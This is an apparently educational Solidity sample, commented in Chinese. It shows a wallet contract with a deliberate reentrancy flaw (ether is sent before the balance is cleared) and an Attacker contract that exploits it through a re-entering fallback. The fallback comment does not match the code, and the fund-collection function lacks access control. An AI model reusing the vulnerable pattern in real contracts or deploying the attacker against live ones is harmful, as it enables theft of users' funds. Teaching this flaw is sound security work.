// 以下為含有 Unsafe Credit Transfer 漏洞的範例程式碼
// 此漏洞允許攻擊者透過 reentrancy 攻擊，在呼叫 withdrawBalance 時在外部呼叫前未先更新 userBalances 狀態變數，從而重複提款，超出原有餘額。

contract WalletVulnerable {
    // 漏洞重點：狀態變數 userBalances 在提款前未妥善更新
    mapping(address => uint) private userBalances;

    // 提款前允許存款
    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    // 漏洞函式：withdrawBalance
    // 說明：先做外部呼叫再更新狀態變數，可能導致攻擊者在呼叫過程中遞迴觸發 withdrawBalance，進而重複提款
    function withdrawBalance() public {
        // 取得當前使用者餘額
        uint amountToWithdraw = userBalances[msg.sender];

        if (amountToWithdraw > 0) {
            // 漏洞：先執行外部呼叫，讓攻擊合約可以利用回呼再次進入此函式
            (bool success, ) = msg.sender.call{value: amountToWithdraw}('');
            require(success, 'Transfer failed');
            // 狀態更新在外部呼叫之後，造成 reentrancy 漏洞
            userBalances[msg.sender] = 0;
        }
    }
}

// 以下為攻擊合約，展示如何利用上述漏洞進行攻擊
contract Attacker {
    WalletVulnerable public vulnerableWallet;
    // 控制變數，避免無限遞迴
    bool internal attackInProgress = false;

    // 建構子：設定目標 Wallet 合約
    constructor(address _walletAddress) {
        vulnerableWallet = WalletVulnerable(_walletAddress);
    }

    // 攻擊入口函式，攻擊者先 deposit 一定金額以登記使用者餘額，再進行 withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, 'Need at least 1 ether to attack');
        // deposit 存款至受害合約
        vulnerableWallet.deposit{value: msg.value}();
        // 從受害合約提款，觸發 reentrancy
        vulnerableWallet.withdrawBalance();
    }

    // fallback 函式：當從 Wallet 收到款項時，自動再次呼叫 withdrawBalance 以重複提款攻擊
    fallback() external payable {
        // 檢查受害合約是否仍有餘額可提款，避免無限遞迴
        if (!attackInProgress) {
            attackInProgress = true;
            // 重入呼叫 withdrawBalance
            vulnerableWallet.withdrawBalance();
        }
    }

    // 攻擊結束後，攻擊者可提取攻擊合約中的所有資金
    function collectFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// 補充說明：
// 1. 此範例展示了 unsafe credit transfer 的漏洞，透過先呼叫外部介面再更改狀態數值，攻擊者能夠在接收款項後重入 withdrawBalance 函式。
// 2. 實際攻擊可能需透過多次調整攻擊流程與控制 reentrancy 次數，而本範例為最小可行攻擊樣板。